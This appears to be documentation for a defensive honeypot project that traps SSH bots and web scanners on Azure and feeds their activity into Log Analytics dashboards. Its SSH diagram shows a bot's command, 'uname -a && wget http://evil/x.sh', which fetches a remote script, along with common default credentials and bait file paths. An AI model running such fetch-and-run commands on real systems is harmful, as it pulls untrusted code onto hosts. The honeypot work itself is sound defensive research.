# How it works

This page follows three journeys through the system: an SSH attack, a web probe, and a single log line on its way to the dashboard.

## 1. An SSH brute-force bot

```mermaid
sequenceDiagram
    autonumber
    actor Bot as Bot 77.91.71.92
    participant NSG as cb-nsg
    participant IPT as iptables
    participant C as Cowrie :2222
    participant F as cowrie.json
    participant AMA as Azure Monitor Agent
    participant LA as Log Analytics

    Bot->>NSG: TCP SYN :22
    NSG->>IPT: allowed (Honeypot-Ingress)
    IPT->>C: REDIRECT 22 → 2222
    C-->>Bot: SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3
    C->>F: cowrie.session.connect / client.version / client.kex
    Bot->>C: login root / 123456
    C->>F: cowrie.login.success (username, password)
    C-->>Bot: fake shell root@kd-api-prod01:~#
    Bot->>C: uname -a && wget http://evil/x.sh
    C->>F: cowrie.command.input
    C--xBot: wget fails (outbound Internet denied)
    Bot->>C: exit
    C->>F: cowrie.session.closed (duration)
    F->>AMA: fluent-bit tails new lines
    AMA->>LA: CowrieLogs_CL rows within ~1 min
```

The real `sshd` never sees this traffic. It listens only on 22022, which only the admin IP can reach.

## 2. A web scanner looking for secrets

```mermaid
sequenceDiagram
    autonumber
    actor S as Scanner
    participant NSG as cb-nsg
    participant N as nginx :80/:443
    participant A as cloudbait_web.py :8080
    participant W as web.json
    participant LA as Log Analytics

    S->>NSG: GET /.env
    NSG->>N: allowed
    N->>A: proxy + X-Forwarded-For, X-Forwarded-Proto
    A-->>S: 200 APP_ENV=demo ... (no secrets)
    A->>W: {src_ip, method, uri, status, user_agent, ...}
    S->>N: POST /admin username=admin&password=admin
    N->>A: proxy
    A-->>S: 401 Invalid username or password
    A->>W: {..., login_username, login_password}
    W->>LA: CloudBaitWeb_CL rows
```

### Fake application map

```mermaid
flowchart LR
    root["/ home<br/>Kipeo Digital Services"]
    root --> login["/login · /admin · /dashboard<br/>/wp-login.php · /phpmyadmin<br/>login form, POST → 401"]
    root --> api["/api docs"]
    api --> v1["/api/v1/users · customers<br/>transactions · admin<br/>fake JSON record counts"]
    api --> tok["/api/v1/auth/token → 401"]
    root --> bait["Bait files"]
    bait --> env["/.env"]
    bait --> cfg["/config.json · /config → 302"]
    bait --> bk["/backup/ listing<br/>backup_2026.sql<br/>customer_export.csv<br/>employee_list.csv<br/>transactions.csv"]
    bait --> up["/uploads/ listing"]
    root --> robots["/robots.txt<br/>Disallow /admin /backup /config"]
    root --> nf["anything else → 404"]
```

`robots.txt` is part of the bait: it "hides" exactly the paths scanners want to find.

## 3. One log line becomes a dashboard tile

```mermaid
flowchart LR
    line["cowrie.json line<br/>{eventid, src_ip, username,<br/>password, input, timestamp...}"]
    fb["fluent-bit tail<br/>RawData = whole line"]
    dce["cb-dce<br/>ingestion endpoint"]
    tx["DCR transformKql<br/>parse_json(RawData)<br/>→ EventId, SrcIp, Username,<br/>Password, Command, ..."]
    tbl[("CowrieLogs_CL<br/>typed columns")]
    q["queries/*.kql<br/>exclude admin IP + selftest<br/>since exposure time"]
    wb["Workbook panel<br/>e.g. 05 TOP USERNAMES"]

    line --> fb --> dce --> tx --> tbl --> q --> wb
```

The web log follows the same path into `CloudBaitWeb_CL`. Syslog (auth, daemon, kern and others) and the agent's `Heartbeat` go straight to their built-in tables.

### Table schemas

```mermaid
erDiagram
    CowrieLogs_CL {
        datetime TimeGenerated
        string EventId
        string SrcIp
        int DstPort "2222 ssh, 2223 telnet"
        string Session
        string Username
        string Password
        string Command
        string ClientVersion
        string Url
        string Sha256
        real Duration
        string RawData
    }
    CloudBaitWeb_CL {
        datetime TimeGenerated
        string SrcIp
        string Method
        string UrlPath
        string Query
        int Status
        string Scheme
        string UserAgent
        string LoginUsername
        string LoginPassword
        string Body
        string RawData
    }
```

## Dashboard panels

```mermaid
mindmap
  root((WHO IS ATTACKING MY CLOUD?))
    Volume
      01 Total activity
      02 Unique source IPs
      03 Activity over time
    Targets
      04 Top services
      06 Top URLs
    Credentials
      05 Top usernames and passwords
      11 SSH client fingerprints
    Behaviour
      08 Most suspicious IPs
      09 Attacker commands and downloads
    Story
      07 Geography
      10 Time to first attack
```
